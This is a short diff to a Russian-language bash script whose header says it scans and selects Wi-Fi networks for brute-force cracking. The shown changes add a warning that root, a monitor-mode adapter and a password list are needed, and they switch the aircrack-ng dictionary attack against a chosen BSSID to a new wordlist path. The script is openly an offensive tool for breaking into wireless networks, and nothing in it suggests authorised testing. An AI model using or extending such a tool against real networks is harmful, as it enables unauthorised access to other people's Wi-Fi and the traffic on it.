@@ -1,6 +1,7 @@
 #!/bin/bash
 # Скрипт сканирования и выбора Wi-Fi сети для взлома брутом, автор kirikra
-
+echo "ВНИМАНИЕ: данный модуль требует- root, вайфай адаптер м режимом монитора и списка паролей который вы сами должны установить в data/lists/pass.txt"
+sleep 7
 # Функция для сканирования Wi-Fi сетей
 scan_networks() {
     rm file-01.cap file-01.csv file-01.kismet.csv file-01.kismet.netxml file-01.log.csv scan_results-01.csv
@@ -28,7 +29,7 @@ select_network() {
     then
     echo "Приступаю ко взлому через 3 секунды"
     sleep 3
-    aircrack-ng -w lists/9mil.txt -b $BSSID file-01.cap
+    aircrack-ng -w lists/pass.txt -b $BSSID file-01.cap
     else
     echo "КАП файл под названием file-01.cap сохранен, проверьте другие файлы для анализа в случае неообходимости"
     fi
